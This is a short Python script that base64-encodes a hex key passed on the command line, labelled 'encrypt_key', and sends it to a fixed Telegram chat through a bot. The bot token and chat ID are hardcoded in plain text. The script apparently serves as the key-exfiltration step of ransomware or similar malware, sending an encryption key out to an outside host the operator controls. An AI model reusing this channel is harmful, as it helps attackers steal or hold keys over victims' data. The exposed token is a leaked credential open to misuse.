import telegram as tel
import asyncio
import base64
import sys

# fuction: encoding base64
def encode_to_base64(byte_data):  # argument type: Byte type
    return base64.b64encode(byte_data).decode('utf-8')

# fuction: send data to myChatBot
async def send_message():
    bot = tel.Bot(token="6345282020:AAE4Z_7L9islIhFbBfkMcY3Sa5m2ZkrvxJE")  # botToken value
    chatBot_ID = 6478368513  # chatBot ID value

    encrypt_key = bytes.fromhex(sys.argv[1])  # argument type conversion: hex string to Byte type

    await bot.send_message(chat_id=chatBot_ID, text=encode_to_base64(encrypt_key))  # send data

asyncio.run(send_message())

# main
if __name__ == '__main__':
    send_message()
